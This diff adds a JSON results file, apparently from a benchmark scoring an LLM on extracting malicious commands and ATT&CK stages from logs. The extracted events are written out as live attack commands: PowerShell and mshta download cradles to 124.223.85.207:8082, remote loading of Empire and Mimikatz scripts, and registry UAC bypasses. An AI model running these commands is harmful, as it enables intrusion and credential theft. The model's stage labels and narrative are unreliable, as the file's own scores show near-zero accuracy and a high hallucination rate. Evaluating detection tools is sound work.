@@ -1,0 +1,286 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\\Program Files\\(x86)\\Microsoft\\Edge\\Application\\msedge.exe --type=gpu-process --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1960 --field-trial-handle=1812,i,13969245107114674510,14049462321786369646,131072 /prefetch:2",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Program Files\\(x86)\\Microsoft\\Edge\\Application\\msedge.exe --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=8 --launch-time-ticks=268904258981 --mojo-platform-channel-handle=3380 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:1",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "C:\\Program Files\\WindowsApps\\microsoft.windowscommunicationsapps_16005.14326.20858.0_x64__8wekyb3d8bbwe\\HxOutlook.exe -ServerName:microsoft.windowslive.mail.AppXfbjsbkxvprcgqg6q4c9jfr0pn3kv9x5s.mca",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\Program Files\\(x86)\\Microsoft\\Edge\\Application\\DEVOBJ.dll",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u1e72.ucliju65ir.rs1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Start-Process .\\T1059.003_script.bat\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powercat2.ps1 -Listen -Port 8443 -IP 127.0.0.1",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo test >> test.exe\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\kv5u34xf\\kv5u34xf.cmdline\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "new-gen.go --export COORDINATOR=True",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "Del /f HookSSLX64.dll",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "echo \"C:\\Windows\\System32\\cmd.exe\" >> \\?\\C:\\Windows\\System32\\cmd.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg.exe add \"HKCU\\\\software\\\\classes\\\\mscfile\\\\shell\\\\open\\\\command\" /ve /d \"C:\\\\Windows\\\\System32\\\\cmd.exe\" /f",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe & {New-Item \"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\" -Force}",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "reg.exe add \"HKCU\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\" /ve /d \"C:\\\\Windows\\\\System32\\\\cmd.exe\" /f",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "reg.exe add \"HKCU\\\\environment\" /v windir /d \"cmd /c start powershell&REM \" /f",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe delete \"HKCU\\\\environment\" /v windir /F",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \"domain admins\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005\", \"Invoke-AtomicTest t1547.001",
+        "stage": "Discovery"
+      },
+      {
+        "command": "new-gen.go --listen 127.0.0.1 --bind 127.0.0.1:8443",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta C:\\Test.hta",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '\\\\.\\\\msxsl.exe' 'c:\\Windows\\\\Temp\\\\msxsl.exe'",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe & {if (Test-Path $env:TEMP\\T1059.003_script.bat) {exit 0} else {exit 1}} ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe & {Start-Process $env:TEMP\\T1059.003_script.bat}",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe & {New-Item \\\"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\\\" -Force Set-ItemProperty \\\"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\\\" -Name \\\"(default)\\\" -Value \\\"C:\\Windows\\System32\\cmd.exe\\\" -Force Start-Process \\\"C:\\Windows\\System32\\eventvwr.msc\\\"}",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C T1059.006.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C \"certutil.exe -decode a.txt b.txt\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cmd.exe /C \"netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe & {New-Item \"$env:SystemRoot\\SysWOW64\\Msgr.dll\" -ErrorAction SilentlyContinue | Remove-Item -Force}",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe & {New-Item \"$env:SystemRoot\\System32\\Msgr.dll\" -ErrorAction SilentlyContinue | Remove-Item -Force}",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/red_team.hta -Method 'GET' -UseBasicParsing -ContentType \\\"text/html\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /C tor.lnk",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Add-Type -AssemblyName System.IO.Compression.FileSystem\";",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/coreimpact/stalker/master/src/Stalker.ps1' -UseBasicParsing)",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"$creds = New-Object System.Net.NetworkCredential('username', 'password'); $apiUrl = 'https://your-api.com/api-endpoint'; $httpClient = New-Object System.Net.Http.HttpClient; $response = $httpClient.GetAsync($apiUrl); Write-Output $response;\", ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "net.exe group \"domain admins\" /domain",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Windows_credentials.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/devel/resolve_user.ps1' -UseBasicParsing); Resolve-User -Username Administrator -Domain foo.bar`, ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PInvoke/mimikatz/main/Mimikatz.csproj' -UseBasicParsing); Mimikatz()",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR'https://raw.githubusercontent.com/stealthbits-io/powershell_scripts/master/get_all_users_with_admin_privileges.ps1' -UseBasicParsing); Get-All-AdminUsers",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/powermuffin/virus_total_api/master/vt_download_file.ps1' -UseBasicParsing); VTDownloadFile -Hash e5f95a1c8e47004dc83d6dd5e3e32a4ce7b01199",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-RestMethod -Uri 'https://github.com/karlatpt/SharpSploit/blob/master/Framework/Secrets.ps1' -UseBasicParsing -OutFile C:\\Temp\\Secrets.ps1\";",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/lambdadbs/shellprice/master/ShellsPrice.ps1' -UseBasicParsing); ShellPrice -Price $creds.Price",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/Vagelis-T/PowerUpSQL/master/PowerUpSQL.ps1' -UseBasicParsing); PowerUpSQL",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/CopyPasteScriptGuy/CSVtoJsonMaster/master/CSVToJSON.ps1' -UseBasicParsing); CSVToJson ('path_to_csv.csv', 'output.json');\", ",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The attackers initially gained access through either MSHTA or PowerShell downloads from an unknown source 'http://124.223.85.207:8082'. They then attempted various activities such as creating persistence via registry changes, evading detection by removing security tools, carrying out discovery, credential dumping, lateral movement, and establishing communication channels. Further investigation reveals additional collection activities involving hash lookups and potential exploitation of vulnerabilities. Overall, the attackers sought to gather sensitive information, maintain a presence within the network, and eventually exfiltrate valuable data.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 123883,
+      "completion_tokens": 7451,
+      "total_tokens": 131334,
+      "wall_clock_s": 118.122,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.11864406779661017,
+      "recall": 0.4375,
+      "f1": 0.18666666666666668,
+      "tp": 7,
+      "fp": 52,
+      "fn": 9
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 59,
+      "fn": 14,
+      "recall_partial": 0.17857142857142858
+    },
+    "hallucination_rate": 0.41509433962264153,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 123883,
+      "completion_tokens": 7451,
+      "total_tokens": 131334,
+      "wall_clock_s": 118.122,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
